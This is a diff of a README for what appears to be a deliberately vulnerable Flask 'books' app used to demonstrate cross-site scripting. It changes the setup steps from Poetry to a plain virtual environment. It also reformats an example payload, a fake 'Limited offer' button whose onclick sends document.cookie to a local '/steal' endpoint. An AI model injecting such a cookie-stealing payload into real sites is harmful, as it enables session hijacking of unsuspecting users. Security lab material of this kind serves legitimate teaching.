@@ -3,11 +3,10 @@
 ## Running manually
 ### Requirements
 * Python 3.11 or 3.12
-* Poetry 2 ([Installing instructions](https://python-poetry.org/docs/))
-
-1. Install dependencies
+* 
+1. Create virtual environment
 ```bash
-poetry install
+python -m venv .venv
 ```
 
 1. Create .env file like `example.env`
@@ -15,9 +14,7 @@ poetry install
 2. Run project
 
 ```bash
-poetry run booksxss
-# Or
-poetry run flask --app flask_books_xss.app run
+flask --app flask_books_xss run
 ```
 
 ## Running in Docker
@@ -53,8 +50,7 @@ docker run --rm -p 8080:5000 -e VULNERABLE_MODE=false books-xss:latest
   <strong>🔥 Limited offer:</strong>
   <button style="padding:6px 10px;border:0;background:#0070f3;color:#fff;cursor:pointer"
     onclick='(function(){
-		fetch("http://127.0.0.1:4000/steal?c=" + encodeURIComponent(document.cookie));	
-          })()'>
+		fetch("http://127.0.0.1:4000/steal?c=" + encodeURIComponent(document.cookie)); })()'>
     Buy now
   </button>
 </div>
